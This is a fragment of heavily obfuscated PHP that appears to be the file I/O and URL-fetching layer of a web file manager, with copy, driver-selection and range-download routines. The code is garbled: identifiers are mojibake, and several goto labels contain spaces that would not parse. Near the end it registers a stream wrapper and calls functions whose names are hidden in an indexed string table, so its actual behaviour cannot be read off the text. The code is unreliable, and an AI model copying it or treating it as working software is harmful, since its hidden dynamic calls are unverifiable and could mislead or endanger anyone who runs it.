$BŞ‚ø–†İñ[$DÍ‘‹¦õŠ[39]] == $DÍ‘‹¦õŠ[177]; $EÏÏó‡ßÚ¾ = $FèœğêÒÊ->getPathInner($BŞ‚ø–†İñ[$DÍ‘‹¦õŠ[85]]); $AïÄ›ÙƒÒ = self::copyPath($FèœğêÒÊ, $EÏÏó‡ßÚ¾, $DÂ´ÚÎÉ™, $BÌØ„­İ© , $D·˜×Šì, $D§‚™•šÔÖ, $e‘‚ª™Ôª); if (!$AïÄ›ÙƒÒ) { write_log($DÍ‘‹¦õŠ[1008] . $EÏÏó‡ßÚ¾ . $DÍ‘‹¦õŠ[1009] . $BÌØ„­İ© , $DÍ‘‹¦õŠ[1010]); } } return $e¡ï‰“Ä”ì; goto cˆ”›–¤ÁŠ; bœç·ÌÂ: if ($aÜÛå÷ä½É) { return self::copyFile($FèœğêÒÊ, $EÏÏó‡ßÚ¾, $DÂ´ÚÎÉ™, $BÌØ„­İ© , $cÆ±¿…·ö…, $D§‚™•šÔÖ); } if ($D·˜×Šì == REPEAT_RENAME_FOLDER) { $D·˜×Šì = !1; } $DØœå“î = rtrim($BÌØ„­İ© , $DÍ‘‹¦õŠ[18]) . $DÍ‘‹¦õŠ[18] . $cÆ±¿…·ö…; goto F ›º˜ôÍß; DÅÑ±…Â¾‰: $DÍ‘‹¦õŠ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cÆ±¿…·ö… = $Aëˆ©Åùİ ? $Aëˆ©Åùİ : $FèœğêÒÊ->getPathName($FèœğêÒÊ->pathThis($EÏÏó‡ßÚ¾)); if ($D·˜×Šì) { $c¾ÈÉ¶‚„® = $DÂ´ÚÎÉ™->fileNameExist($BÌØ„­İ© , $cÆ±¿…·ö…); $cÆ±¿…·ö… = $DÂ´ÚÎÉ™->fileNameAuto($BÌØ„­İ© , $cÆ±¿…·ö…, $D·˜×Šì, !$aÜÛå÷ä½É); $D·˜×Šì = $c¾ÈÉ¶‚„® ? $D·˜×Šì : !1; } goto bœç·ÌÂ; cˆ”›–¤ÁŠ: } private static function copyFile($bù˜›”àÈ, $bùŞ­™õÌÊ, $b”çÜß÷ß¬, $FÁŸ†²¼Ãñ, $eê¨êø¯Õô, $eéŞèë¤‚Ş) { goto bï‰ôÙÃ™ã; a·‰ ¥‚™: Hook::trigger($bÖó‚Æ„‡ò[1012], $bù˜›”àÈ, $bùŞ­™õÌÊ, $b”çÜß÷ß¬, $FÁŸ†²¼Ãñ, $eê¨êø¯Õô, $Dë¹Ø®·’ª); if (self::driverIsSame($bù˜›”àÈ, $b”çÜß÷ß¬)) { if ($eéŞèë¤‚Ş) { $d±ÓîÔ’ = $b”çÜß÷ß¬->moveFile($bùŞ­™õÌÊ, $FÁŸ†²¼Ãñ); } else { $d±ÓîÔ’ = $b”çÜß÷ß¬->copyFile($bùŞ­™õÌÊ, $FÁŸ†²¼Ãñ); } Hook::trigger($bÖó‚Æ„‡ò[1013], $bù˜›”àÈ, $bùŞ­™õÌÊ, $b”çÜß÷ß¬, $FÁŸ†²¼Ãñ, $eê¨êø¯Õô, $d±ÓîÔ’); return $d±ÓîÔ’; } $AÆ–ÄÎˆ = TEMP_FILES; goto D×®ß“õÑ; D×®ß“õÑ: mk_dir($AÆ–ÄÎˆ); $CÑ½–¬Õï = $AÆ–ÄÎˆ . $Dë¹Ø®·’ª; $CÑ½–¬Õï = $bù˜›”àÈ->download($bùŞ­™õÌÊ, $CÑ½–¬Õï); goto cƒ¢£ùƒÎñ; cƒ¢£ùƒÎñ: $CÑ½–¬Õï = $bù˜›”àÈ->iconvApp($CÑ½–¬Õï); $d±ÓîÔ’ = $b”çÜß÷ß¬->upload($FÁŸ†²¼Ãñ, $CÑ½–¬Õï, $eéŞèë¤‚Ş); self::remove($AÆ–ÄÎˆ . $Dë¹Ø®·’ª); goto dà²ÕÚ†òÇ; bï‰ôÙÃ™ã: $bÖó‚Æ„‡ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FÁŸ†²¼Ãñ = $b”çÜß÷ß¬->getPath(rtrim($FÁŸ†²¼Ãñ, $bÖó‚Æ„‡ò[18]) . $bÖó‚Æ„‡ò[18] . $eê¨êø¯Õô); $Dë¹Ø®·’ª = $bÖó‚Æ„‡ò[1011] . time() . rand_string(5); goto a·‰ ¥‚™; dà²ÕÚ†òÇ: Hook::trigger($bÖó‚Æ„‡ò[1013], $bù˜›”àÈ, $bùŞ­™õÌÊ, $b”çÜß÷ß¬, $FÁŸ†²¼Ãñ, $eê¨êø¯Õô, $d±ÓîÔ’); return $d±ÓîÔ’; goto fŸÃ”²‡Ö; fŸÃ”²‡Ö: } public static function pathFather($f¿—¢·Í„½) { $aÄ…ÙŠ©éµ = IO::init($f¿—¢·Í„½); $D‰à‘ÓŠğÈ = $aÄ…ÙŠ©éµ->pathFather($aÄ…ÙŠ©éµ->path); return $aÄ…ÙŠ©éµ->getPathOuter($D‰à‘ÓŠğÈ); } public static function fileOut($d±Ä˜Ìª½», $b”İËÌå = false, $A²ÄÛµÈÚó = false, $F·Ô¶éŞÙ— = '') { $bÈğ×ğá = self::driverMake($d±Ä˜Ìª½»); if ($bÈğ×ğá->isFileOutServer()) { return $bÈğ×ğá->fileOutServer($d±Ä˜Ìª½», $b”İËÌå, $A²ÄÛµÈÚó, $F·Ô¶éŞÙ—); } return $bÈğ×ğá->fileOut($d±Ä˜Ìª½», $b”İËÌå, $A²ÄÛµÈÚó, $F·Ô¶éŞÙ—); } public static function fileOutImage($AÂÔƒÆ•×‚, $e¹ö¹ôÛÂ = 250) { $E‰èÑ‰ù£¥ = array(250, 600, 1200, 3000); for ($BÇ¨Ü‘Š„ = 0; $BÇ¨Ü‘Š„ < count($E‰èÑ‰ù£¥); $BÇ¨Ü‘Š„++) { if ($BÇ¨Ü‘Š„ == 0 && $e¹ö¹ôÛÂ <= $E‰èÑ‰ù£¥[$BÇ¨Ü‘Š„]) { $e¹ö¹ôÛÂ = $E‰èÑ‰ù£¥[$BÇ¨Ü‘Š„]; break; } else { if ($e¹ö¹ôÛÂ > $E‰èÑ‰ù£¥[$BÇ¨Ü‘Š„ - 1] && $e¹ö¹ôÛÂ <= $E‰èÑ‰ù£¥[$BÇ¨Ü‘Š„]) { $e¹ö¹ôÛÂ = $E‰èÑ‰ù£¥[$BÇ¨Ü‘Š„]; break; } else { if ($BÇ¨Ü‘Š„ == count($E‰èÑ‰ù£¥) - 1 && $e¹ö¹ôÛÂ > $E‰èÑ‰ù£¥[$BÇ¨Ü‘Š„]) { $e¹ö¹ôÛÂ = $E‰èÑ‰ù£¥[$BÇ¨Ü‘Š„]; break; } } } } $CË¾±ã£İ = self::driverMake($AÂÔƒÆ•×‚); if ($CË¾±ã£İ->isFileOutServer()) { return $CË¾±ã£İ->fileOutImageServer($AÂÔƒÆ•×‚, $e¹ö¹ôÛÂ); } return $CË¾±ã£İ->fileOutImage($AÂÔƒÆ•×‚, $e¹ö¹ôÛÂ); } private static function driverIsSame($c·÷åÉ¶÷, $bË÷ˆàÇµ) { goto FÁ’Õ²ê‘; a’ï÷ùˆ¾Š: if ($FÑÂµÔõùŠ != $e»šïÁË‚ñ) { return !1; } if ($FÑÂµÔõùŠ == $A¹„—µÅ‘[703]) { return !0; } if ($FÑÂµÔõùŠ == $A¹„—µÅ‘[112]) { return !0; } goto EÎ÷ôÄöÀ¾; FÁ’Õ²ê‘: $A¹„—µÅ‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FÑÂµÔõùŠ = $c·÷åÉ¶÷->getType(); $e»šïÁË‚ñ = $bË÷ˆàÇµ->getType(); goto a’ï÷ùˆ¾Š; EÎ÷ôÄöÀ¾: if ($c·÷åÉ¶÷->pathDriver == $bË÷ˆàÇµ->pathDriver) { return !0; } return !1; goto b“á²´°Ç¥; b“á²´°Ç¥: } public static function copyUpdate($C„…£¯¾éø, $f£–Âõ×ï) { goto D¿í³«ßí‹; AõÇÂØÕ‘Ù: Hook::trigger($D¨¿õ½¼æ[1017], $C„…£¯¾éø, $f£–Âõ×ï, $EŞÚêéÔµš); foreach ($aŞÈºŒŠ as $a§–—˜ßà) { IO::mkdir($a§–—˜ßà); } foreach ($cËŠë¡ºê as $a§–—˜ßà) { IO::copy($a§–—˜ßà[$D¨¿õ½¼æ[1014]], $a§–—˜ßà[$D¨¿õ½¼æ[1015]], REPEAT_REPLACE); } goto F•º±ˆ°; D¿í³«ßí‹: $D¨¿õ½¼æ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!IO::exist($C„…£¯¾éø)) { return !1; } if (!IO::exist($f£–Âõ×ï)) { IO::mkdir($f£–Âõ×ï); } goto Cí–ÕéäçÍ; FªÜÕëŒ£´: $aŞÈºŒŠ = array(); foreach ($EåÁÏõÌíõ as $CŸ§ÓïîğÖ => $a§–—˜ßà) { if (isset($bİ†„À…†[$CŸ§ÓïîğÖ])) { if ($a§–—˜ßà[$D¨¿õ½¼æ[86]] == 1) { continue; } if ($bİ†„À…†[$CŸ§ÓïîğÖ][$D¨¿õ½¼æ[87]] == $a§–—˜ßà[$D¨¿õ½¼æ[87]]) { continue; } } if ($a§–—˜ßà[$D¨¿õ½¼æ[86]] == 1) { $aŞÈºŒŠ[] = $f£–Âõ×ï . $D¨¿õ½¼æ[18] . $CŸ§ÓïîğÖ; continue; } $D•œ…íÖ‡ = strstr(trim($CŸ§ÓïîğÖ, $D¨¿õ½¼æ[18]), $D¨¿õ½¼æ[18]) ? get_path_father($CŸ§ÓïîğÖ) : $D¨¿õ½¼æ[43]; $cËŠë¡ºê[] = array($D¨¿õ½¼æ[1014] => $a§–—˜ßà[$D¨¿õ½¼æ[85]], $D¨¿õ½¼æ[1015] => rtrim($f£–Âõ×ï, $D¨¿õ½¼æ[18]) . $D¨¿õ½¼æ[18] . $D•œ…íÖ‡, $D¨¿õ½¼æ[1016] => $a§–—˜ßà); } $EŞÚêéÔµš = array($D¨¿õ½¼æ[177] => $cËŠë¡ºê, $D¨¿õ½¼æ[86] => $aŞÈºŒŠ); goto AõÇÂØÕ‘Ù; Cí–ÕéäçÍ: $EåÁÏõÌíõ = self::_listAll($C„…£¯¾éø); $bİ†„À…† = self::_listAll($f£–Âõ×ï); $cËŠë¡ºê = array(); goto FªÜÕëŒ£´; F•º±ˆ°: } private static function _listAll($cĞÆ¯õÙŠÑ) { $d™˜ ÊÜÎ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cĞÆ¯õÙŠÑ = KodIO::clear($cĞÆ¯õÙŠÑ); $cÅš¯‚èˆ– = IO::listAll($cĞÆ¯õÙŠÑ); foreach ($cÅš¯‚èˆ– as &$cœ„¡¿²…é) { $d‡ÉãÔÒÄÖ = substr($cœ„¡¿²…é[$d™˜ ÊÜÎ[85]], strlen($cĞÆ¯õÙŠÑ)); $cœ„¡¿²…é[$d™˜ ÊÜÎ[1018]] = trim($d‡ÉãÔÒÄÖ, $d™˜ ÊÜÎ[18]); } unset($cœ„¡¿²…é); return array_to_keyvalue($cÅš¯‚èˆ–, $d™˜ ÊÜÎ[1018]); } public static function fileSubstr($BÌØßğÅˆ, $A‹×Öİñá, $bç¯Œ©Ÿãš = false) { goto bŞ˜¦Ø×§ó; F¢å›©¾Àó: if ($A‹×Öİñá + $bç¯Œ©Ÿãš > $AŠÈÊÄÈĞ¬) { $bç¯Œ©Ÿãš = $AŠÈÊÄÈĞ¬ - $A‹×Öİñá; } if ($bç¯Œ©Ÿãš <= 0) { return $_SERVER[çŞáÓæÚô‚Ô‡][43]; } if ($A‹×Öİñá < 0 || $A‹×Öİñá >= $AŠÈÊÄÈĞ¬ || $bç¯Œ©Ÿãš > 1024 * 1024 * 5) { throw new Exception("\146\x69\x6c\145\122\x65\x61\x64\40\x65\x72\x72\x6f\162\x21\x20\x73\x74\x61\162\164\75{$A‹×Öİñá}\x3b\x6c\x65\x6e\x67\164\x68\x3d{$bç¯Œ©Ÿãš}\73\40\163\x69\172\145\75{$AŠÈÊÄÈĞ¬}\x3b"); } goto B”™†˜ƒù÷; bŞ˜¦Ø×§ó: $f“êÂ¤”ò = self::driverMake($BÌØßğÅˆ); $AŠÈÊÄÈĞ¬ = $f“êÂ¤”ò->size($BÌØßğÅˆ); $Eßªøù¹ôµ = $A‹×Öİñá; goto fôÕ‘¸‹İÄ; fôÕ‘¸‹İÄ: $AĞ†öôÑÛ© = $bç¯Œ©Ÿãš; if ($A‹×Öİñá < 0) { $A‹×Öİñá = $AŠÈÊÄÈĞ¬ + $A‹×Öİñá; } if ($bç¯Œ©Ÿãš === !1) { $bç¯Œ©Ÿãš = $AŠÈÊÄÈĞ¬ - $A‹×Öİñá; } goto F¢å›©¾Àó; B”™†˜ƒù÷: return $f“êÂ¤”ò->fileSubstr($BÌØßğÅˆ, $A‹×Öİñá, $bç¯Œ©Ÿãš); goto EÇ²íñò´æ; EÇ²íñò´æ: } private static function driverMake(&$F•ŠÏ¶‹«¬) { goto eœª¥‹Ë×; f¹¹Êãñ: return $DÊ†‚öĞ¡; goto cÎö£¬àØØ; eœª¥‹Ë×: $eƒ¤·­ÃëÌ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e¹’è„×¼‘ = KodIO::parse($F•ŠÏ¶‹«¬); if (!self::$driverListSystem) { $A™ï«ÄÀã = Model($eƒ¤·­ÃëÌ[712])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($A™ï«ÄÀã, $eƒ¤·­ÃëÌ[376]); } goto F‡ì½ğç„®; F‡ì½ğç„®: if ($e¹’è„×¼‘[$eƒ¤·­ÃëÌ[39]] == KodIO::KOD_IO && !self::$driverListSystem[$e¹’è„×¼‘[$eƒ¤·­ÃëÌ[376]]]) { return !1; } $F•ŠÏ¶‹«¬ = $e¹’è„×¼‘[$eƒ¤·­ÃëÌ[1019]]; $DÊ†‚öĞ¡ = self::driverGet($e¹’è„×¼‘, $F•ŠÏ¶‹«¬); goto f¹¹Êãñ; cÎö£¬àØØ: } private static function driverGet($DÁùÜ¶Ó¿, &$a›Ê¯ÆìÍÙ) { goto f½ˆ×·”ÎË; DÓì„Á: $F©¹‡†”ğì->path = $a›Ê¯ÆìÍÙ; return $F©¹‡†”ğì; goto d¯ÄÚÄ¿—é; f½ˆ×·”ÎË: $CóÒ‰¤ÄÚ‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a‰êæŸÔÏ = $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[1020]]; $aä‹ÕĞ«ó£ = $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[376]]; goto D‰ƒâ×ñÅ; D‰ƒâ×ñÅ: switch ($DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[39]]) { case KodIO::KOD_IO: $F·ŒíË–ØĞ = self::$driverListSystem[$aä‹ÕĞ«ó£]; break; case KodIO::KOD_SOURCE: $a›Ê¯ÆìÍÙ = $aä‹ÕĞ«ó£ . $a›Ê¯ÆìÍÙ; $F·ŒíË–ØĞ = array($CóÒ‰¤ÄÚ‹[1021] => $CóÒ‰¤ÄÚ‹[1022], $CóÒ‰¤ÄÚ‹[16] => $DÁùÜ¶Ó¿); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $dÇ·ŠéÄ× = $GLOBALS[$CóÒ‰¤ÄÚ‹[1023]]; self::$driverListUser = array_to_keyvalue($dÇ·ŠéÄ×, $CóÒ‰¤ÄÚ‹[376]); } $F·ŒíË–ØĞ = self::$driverListUser[$aä‹ÕĞ«ó£]; break; case KodIO::KOD_SHARE_LINK: $F·ŒíË–ØĞ = array($CóÒ‰¤ÄÚ‹[1021] => $CóÒ‰¤ÄÚ‹[1024], $CóÒ‰¤ÄÚ‹[16] => $DÁùÜ¶Ó¿); $b™‹º¶°òØ = Action($CóÒ‰¤ÄÚ‹[1025])->sharePathInfo($DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[85]]); $a›Ê¯ÆìÍÙ = $b™‹º¶°òØ[$CóÒ‰¤ÄÚ‹[378]]; if (!$b™‹º¶°òØ[$CóÒ‰¤ÄÚ‹[378]]) { $féĞîØÀƒ = Model($CóÒ‰¤ÄÚ‹[547])->getInfo($b™‹º¶°òØ[$CóÒ‰¤ÄÚ‹[450]]); $a›Ê¯ÆìÍÙ = KodIO::clear($féĞîØÀƒ[$CóÒ‰¤ÄÚ‹[1026]] . $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[1019]]); $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[448]] = $féĞîØÀƒ; $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[1005]] = $a›Ê¯ÆìÍÙ; $F·ŒíË–ØĞ = array($CóÒ‰¤ÄÚ‹[1021] => $CóÒ‰¤ÄÚ‹[1027], $CóÒ‰¤ÄÚ‹[16] => $DÁùÜ¶Ó¿); } break; case KodIO::KOD_SHARE_ITEM: $F·ŒíË–ØĞ = array($CóÒ‰¤ÄÚ‹[1021] => $CóÒ‰¤ÄÚ‹[1028], $CóÒ‰¤ÄÚ‹[16] => $DÁùÜ¶Ó¿); $féĞîØÀƒ = Model($CóÒ‰¤ÄÚ‹[547])->getInfo($DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[376]]); if ($féĞîØÀƒ[$CóÒ‰¤ÄÚ‹[378]] == $CóÒ‰¤ÄÚ‹[479]) { $a›Ê¯ÆìÍÙ = KodIO::clear($féĞîØÀƒ[$CóÒ‰¤ÄÚ‹[1026]] . $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[1019]]); $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[448]] = $féĞîØÀƒ; $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[1005]] = $a›Ê¯ÆìÍÙ; $F·ŒíË–ØĞ = array($CóÒ‰¤ÄÚ‹[1021] => $CóÒ‰¤ÄÚ‹[1029], $CóÒ‰¤ÄÚ‹[16] => $DÁùÜ¶Ó¿); } else { if (!$a›Ê¯ÆìÍÙ) { $a›Ê¯ÆìÍÙ = $féĞîØÀƒ[$CóÒ‰¤ÄÚ‹[378]]; } } break; default: $a›Ê¯ÆìÍÙ = $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[85]]; $F·ŒíË–ØĞ = array($CóÒ‰¤ÄÚ‹[1021] => $CóÒ‰¤ÄÚ‹[1030]); break; } $d× ³¨ÊÄÅ = $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[85]]; if (!isset(self::$driverCache[$d× ³¨ÊÄÅ])) { $CÅ­ŞËø = strtolower($F·ŒíË–ØĞ[$CóÒ‰¤ÄÚ‹[100]]); $aó›÷ÄÔ®ö = $GLOBALS[$CóÒ‰¤ÄÚ‹[16]][$CóÒ‰¤ÄÚ‹[94]][$CóÒ‰¤ÄÚ‹[762]]; $EÆ×¡°ø¼Œ = $CóÒ‰¤ÄÚ‹[81] . (isset($aó›÷ÄÔ®ö[$CÅ­ŞËø]) ? $aó›÷ÄÔ®ö[$CÅ­ŞËø] : ucfirst($CÅ­ŞËø)); if (!class_exists($EÆ×¡°ø¼Œ)) { show_json("{$EÆ×¡°ø¼Œ}\40\x6e\x6f\x74\40\145\x78\x69\x73\164\x73\41", !1); } $B•¨ë¼ª‘ = isset($F·ŒíË–ØĞ[$CóÒ‰¤ÄÚ‹[16]]) ? $F·ŒíË–ØĞ[$CóÒ‰¤ÄÚ‹[16]] : !1; self::$driverCache[$d× ³¨ÊÄÅ] = new $EÆ×¡°ø¼Œ($B•¨ë¼ª‘); } goto FÈÈôÉŒ; FÈÈôÉŒ: $F©¹‡†”ğì = self::$driverCache[$d× ³¨ÊÄÅ]; $F©¹‡†”ğì->pathDriver = $a‰êæŸÔÏ; $F©¹‡†”ğì->pathBase = $CóÒ‰¤ÄÚ‹[43]; goto AšİŸ©„éê; AšİŸ©„éê: if (isset($F·ŒíË–ØĞ[$CóÒ‰¤ÄÚ‹[16]][$CóÒ‰¤ÄÚ‹[1031]])) { $F©¹‡†”ğì->pathBase = rtrim($F·ŒíË–ØĞ[$CóÒ‰¤ÄÚ‹[16]][$CóÒ‰¤ÄÚ‹[1031]], $CóÒ‰¤ÄÚ‹[18]) . $CóÒ‰¤ÄÚ‹[18]; $a›Ê¯ÆìÍÙ = $F©¹‡†”ğì->pathBase . ltrim($a›Ê¯ÆìÍÙ, $CóÒ‰¤ÄÚ‹[18]); } $a›Ê¯ÆìÍÙ = $F©¹‡†”ğì->getPath($a›Ê¯ÆìÍÙ); if (isset($DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[1005]])) { $a›Ê¯ÆìÍÙ = $DÁùÜ¶Ó¿[$CóÒ‰¤ÄÚ‹[1005]]; } goto DÓì„Á; d¯ÄÚÄ¿—é: } } goto A‰ÌÈİĞŒ¶; b¸‰À­¾­ì: $_SERVER[$_SERVER[·ü][49]] = ("\x31\x30\x30\x33".strrev('618'))+0;$_Tp6n="aSn8imdaPGSWzMJNcj6WwMFW3qg8Fa9DrPtNhBrjqqEAuDrYWc2xvib2BhxK7VAYaRI47UdTe";; stream_wrapper_register($_SERVER[·ü][50], $_SERVER[·ü][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($cÓ²ôäò¶¦, $cí‘¤Î¡½Ç) { $B®¬¤ÖšæÏ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (isset(self::$_methodList[$cÓ²ôäò¶¦])) { return @call_user_func_array(self::$_methodList[$cÓ²ôäò¶¦], $cí‘¤Î¡½Ç); } else { if (method_exists($this, $cÓ²ôäò¶¦)) { return call_user_func_array(array($this, $cÓ²ôäò¶¦), $cí‘¤Î¡½Ç); } else { think_exception(__CLASS__ . $B®¬¤ÖšæÏ[4] . $cÓ²ôäò¶¦ . $B®¬¤ÖšæÏ[5]); } } } public static function __callStatic($dà¢Ÿç’†×, $FœÌÇç¯÷õ) { if (isset(self::$_methodListStatic[$dà¢Ÿç’†×])) { return call_user_func_array(self::$_methodListStatic[$dà¢Ÿç’†×], $FœÌÇç¯÷õ); } else { if (method_exists(self, $dà¢Ÿç’†×)) { return call_user_func_array(array(self, $dà¢Ÿç’†×), $FœÌÇç¯÷õ); } else { show_json("{$dà¢Ÿç’†×}\x28\x29\x20\156\157\x74\40\145\170\x69\x73\x74\x3b", !1); } } } public static function addMethod($d•´ŠŒ¦Ó¿, $BğÜÓšâß) { self::$_methodList[$d•´ŠŒ¦Ó¿] = $BğÜÓšâß; } public static function addMethodStatic($a°ÑË‘Æáé, $Cº”Ù¢¯Œå) { self::$_methodListStatic[$a°ÑË‘Æáé] = $Cº”Ù¢¯Œå; } } goto DÏ‘¹êîŒ†; Bá¿ÑŸ©‘: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($fÎ²ôÒ®øŠ = false) { } public function exist($EŸÅ‚çë§Š) { $cÏ‹Ş…®‘ = $this->info($EŸÅ‚çë§Š); return $cÏ‹Ş…®‘[$_SERVER[çŞáÓæÚô‚Ô‡][198]]; } public function isFile($a©Š¾ÑÓ‰») { $a¨Ú™Ù‰‡² = $this->info($a©Š¾ÑÓ‰»); return $a¨Ú™Ù‰‡²[$_SERVER[çŞáÓæÚô‚Ô‡][198]]; } public function isFolder($Cø¶¤¶ÕÌ†) { return !1; } public function size($D×¬³Ø¿çÂ) { $fï¼Ëæ´ì‡ = $this->info($D×¬³Ø¿çÂ); return $fï¼Ëæ´ì‡[$_SERVER[çŞáÓæÚô‚Ô‡][87]]; } public function info($e÷§ ›íØ¼) { return $this->infoParse($e÷§ ›íØ¼); } public function infoAuth($d„ôÓ‹‡‰) { return $this->infoParse($d„ôÓ‹‡‰); } public function infoWithChildren($c°²ÂÇñÖ) { return $this->infoParse($c°²ÂÇñÖ); } public function infoFull($DèïïâÀßŸ) { return $this->infoParse($DèïïâÀßŸ); } private function infoParse($aæ‚Ãˆ„£¼) { $Fîçšô‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÃ”‘‚÷ = $this->header($aæ‚Ãˆ„£¼); if (!$EÃ”‘‚÷ || !$EÃ”‘‚÷[$Fîçšô‡[698]]) { return !1; } $eÉŸòäÆ‰Æ = _get($EÃ”‘‚÷, $Fîçšô‡[334], 0); $A®îŒˆİ¿ = array($Fîçšô‡[38] => $EÃ”‘‚÷[$Fîçšô‡[38]], $Fîçšô‡[85] => $aæ‚Ãˆ„£¼, $Fîçšô‡[39] => $Fîçšô‡[177], $Fîçšô‡[87] => intval($eÉŸòäÆ‰Æ), $Fîçšô‡[170] => get_path_ext($EÃ”‘‚÷[$Fîçšô‡[38]]), $Fîçšô‡[1169] => $eÉŸòäÆ‰Æ > 0 && $EÃ”‘‚÷[$Fîçšô‡[1295]], $Fîçšô‡[1170] => !1); return $A®îŒˆİ¿; } private function header($dÕßÔÖÁ„º) { if (isset(self::$_cacheHeader[$dÕßÔÖÁ„º])) { return self::$_cacheHeader[$dÕßÔÖÁ„º]; } self::$_cacheHeader[$dÕßÔÖÁ„º] = url_header($dÕßÔÖÁ„º); return self::$_cacheHeader[$dÕßÔÖÁ„º]; } public function hashSimple($C­Õ–”ö¡, $a—Ş¢ëŸÀ = false) { goto A ‘¡¼Øî; Fïõ…ˆ‡†: if ($CéÅŸÏÑã <= $AÎ½´Í­âÅ * $D¸ŒŒ¼Ğ˜º) { return md5($this->fileSubstr($C­Õ–”ö¡, 0, $CéÅŸÏÑã)) . $CéÅŸÏÑã; } $aÉšø³ëäì = intval($CéÅŸÏÑã / $D¸ŒŒ¼Ğ˜º); $CêùÒ®¹èœ = $d”š¦İªÏÛ[43]; goto føâ˜˜†«´; b´÷¬¿˜Õæ: $CéÅŸÏÑã = $A¹Ğóø¢÷[$d”š¦İªÏÛ[87]]; $AÎ½´Í­âÅ = 200; $D¸ŒŒ¼Ğ˜º = 50; goto Fïõ…ˆ‡†; A ‘¡¼Øî: $d”š¦İªÏÛ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A¹Ğóø¢÷ = $this->info($C­Õ–”ö¡); if (!$A¹Ğóø¢÷ || !$A¹Ğóø¢÷[$d”š¦İªÏÛ[198]]) { return !1; } goto b´÷¬¿˜Õæ; føâ˜˜†«´: $E›Î˜‹ƒƒ· = timeFloat(); $FÔéïæ‰ = 15; for ($A“¢ò‚ÇÑ„ = 0; $A“¢ò‚ÇÑ„ < $D¸ŒŒ¼Ğ˜º; $A“¢ò‚ÇÑ„++) { if (timeFloat() - $E›Î˜‹ƒƒ· > $FÔéïæ‰) { return !1; } $B”„Å–Ô¯ = $this->fileSubstr($C­Õ–”ö¡, $aÉšø³ëäì * $A“¢ò‚ÇÑ„, $AÎ½´Í­âÅ); if (!$B”„Å–Ô¯) { return !1; } $CêùÒ®¹èœ .= $B”„Å–Ô¯; } goto bÌôİŒ‚º; bÌôİŒ‚º: $CêùÒ®¹èœ .= $this->fileSubstr($C­Õ–”ö¡, $CéÅŸÏÑã - $AÎ½´Í­âÅ, $AÎ½´Í­âÅ); return md5($CêùÒ®¹èœ) . $CéÅŸÏÑã; goto dÛ´„«‚…È; dÛ´„«‚…È: } public function getContent($aÏô¡²†ÍÄ) { return $this->fileSubstr($aÏô¡²†ÍÄ); } public function fileSubstr($eÏ•ÙèÙá, $F×ŸŞ¥×¢á = 0, $fÛö²²ÂœÒ = -1) { goto C†Æ‘ø•Øä; C†‘åš• ¬: if ($fÛö²²ÂœÒ === -1) { $fÛö²²ÂœÒ = $d‹„ê´­«¤[$e ×ÂšÄ¬ƒ[87]]; } if ($fÛö²²ÂœÒ == 0) { return $e ×ÂšÄ¬ƒ[43]; } $B£Š›è¥é³ = array($e ×ÂšÄ¬ƒ[1296] . $F×ŸŞ¥×¢á . $e ×ÂšÄ¬ƒ[724] . ($F×ŸŞ¥×¢á + $fÛö²²ÂœÒ - 1)); goto EØ¡’®‚öÕ; EØ¡’®‚öÕ: $Fåƒ©‚Ö…î = url_request($eÏ•ÙèÙá, $e ×ÂšÄ¬ƒ[226], !1, $B£Š›è¥é³, !1, !1, 1); return $Fåƒ©‚Ö…î[$e ×ÂšÄ¬ƒ[1041]] ? $Fåƒ©‚Ö…î[$e ×ÂšÄ¬ƒ[1041]] : $e ×ÂšÄ¬ƒ[43]; goto d Ã…³ß‡; C†Æ‘ø•Øä: $e ×ÂšÄ¬ƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d‹„ê´­«¤ = $this->info($eÏ•ÙèÙá); if (!$d‹„ê´­«¤ || !$d‹„ê´­«¤[$e ×ÂšÄ¬ƒ[198]] && $d‹„ê´­«¤[$e ×ÂšÄ¬ƒ[87]] > 1024 * 1024 * 10) { return !1; } goto C†‘åš• ¬; d Ã…³ß‡: } public function download($c¥‹Æš«ƒ£, $D¦„…¨‹­Å) { Downloader::start($c¥‹Æš«ƒ£, $D¦„…¨‹­Å); return $D¦„…¨‹­Å; } } if ($_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][6]] != $_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][7]]) { goto D””¶Ó½İ–; Bà‰í‚£²: $a…Å³”øˆ§($_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][15]]); goto CŞš‚å’¸Â; Eìº‘ÊÂõ: $b¶’†Åˆöò = explode($_SERVER[çŞáÓæÚô‚Ô‡][11], $dˆ©ÚÊÒ¦î); if (count($b¶’†Åˆöò) < $_SERVER[çŞáÓæÚô‚Ô‡][12]) { $BÏ¹‹‘áßª = $_SERVER[çŞáÓæÚô‚Ô‡][13]; $BÏ¹‹‘áßª(); } $a…Å³”øˆ§ = $_SERVER[çŞáÓæÚô‚Ô‡][14]; goto Bà‰í‚£²; D””¶Ó½İ–: 